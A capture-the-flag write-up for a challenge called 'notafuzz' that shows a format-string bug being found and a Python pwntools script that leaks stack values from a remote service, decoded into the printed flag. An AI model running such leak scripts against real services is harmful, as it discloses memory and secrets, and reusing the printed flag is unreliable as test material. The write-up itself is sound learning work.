First I opened the program with netcat and tryed it and I was thinking that I can use some vulnerable string like %s %p %x but no luck
Then I tryed to open the binary file with Binary Ninja. I found the main and the input that we give and renamed it to **input** and the for loop iterator to **i**
![img](https://raw.githubusercontent.com/L1ghtDream/cyberedu/master/notafuzz/images/1.png?raw=true)

I found that something special is happening at **i = 3**
![img](https://raw.githubusercontent.com/L1ghtDream/cyberedu/master/notafuzz/images/2.png?raw=true)

But the two ifs are the same I did not found any diferences here in Binary Ninja so I switched to IDA Pro but it could not disassable it.
After that I tryed to use the vulnerable string like %s %p %x at the 3rd iteration and we have an output
Here are the results

```
%p -> 0x1
%x -> 1
```

So I decied to write a code to loop thru all 1000 iterations and see what I get.

```
from pwn import *
from ptrlib import *

def leakAddr(memOffset):
	sock = Socket('34.89.241.255', 30179)
	sock.recvuntil('Do you have the control?')
	sock.sendline('A')
	sock.recvuntil('Do you have the control?')
	sock.sendline('A')
	sock.recvuntil('Do you have the control?\r\n')
	sock.sendline(' | %' + str(memOffset) + '$p | ')
	resp = sock.recvuntil('Do you have the control?')
	sock.close()
	return resp.decode().split(' | ')[3]

for i in range(1000):
	f = open("output.txt", "a")
	f.write(str(i) + " " + leakAddr(i) + "\n")
	f.close
	print(str(i))
```


At iteration **136** I got some values so I stoped the script and copyed them and user the decoder form better-cat to decode it. 

```
136 0x585858587b667463
137 0x5858585836646166
138 0x5858585830343335
139 0x5858585866303831
140 0x5858585863346236
141 0x5858585839346636
142 0x5858585831646164
143 0x5858585861643833
144 0x5858585834646565
145 0x5858585866633734
146 0x5858585839663332
147 0x5858585833363439
148 0x5858585831383435
149 0x5858585835323966
150 0x5858585830663135
151 0x5858585863626435
152 0x5858585830373036
153 0x585858587d
```

**585858587b6674635858585836646166585858583034333558585858663038315858585863346236585858583934663658585858316461645858585861643833585858583464656558585858666337345858585839663332585858583336343958585858313834355858585835323966585858583066313558585858636264355858585830373036585858587d**

And got

**}XXXX6070XXXX5dbcXXXX51f0XXXXf925XXXX5481XXXX9463XXXX23f9XXXX47cfXXXXeed4XXXX38daXXXXdad1XXXX6f49XXXX6b4cXXXX180fXXXX5340XXXXfad6XXXXctf{XXXX**

Still not what I wanted but it on the right way so lets continue. But i quiqly realised that there was a mistake I did not reversed them while copying them so I did that and the new string was

**585858587d5858585830373036585858586362643558585858306631355858585835323966585858583138343558585858333634395858585839663332585858586663373458585858346465655858585861643833585858583164616458585858393466365858585863346236585858586630383158585858303433355858585836646166585858587b667463**

now I got this

**ctf{XXXXfad6XXXX5340XXXX180fXXXX6b4cXXXX6f49XXXXdad1XXXX38daXXXXeed4XXXX47cfXXXX23f9XXXX9463XXXX5481XXXXf925XXXX51f0XXXX5dbcXXXX6070XXXX}XXXX**

I just removed the XXXX I do not know what where those but anyway this is the flag

**ctf{fad65340180f6b4c6f49dad138daeed447cf23f994635481f92551f05dbc6070}**
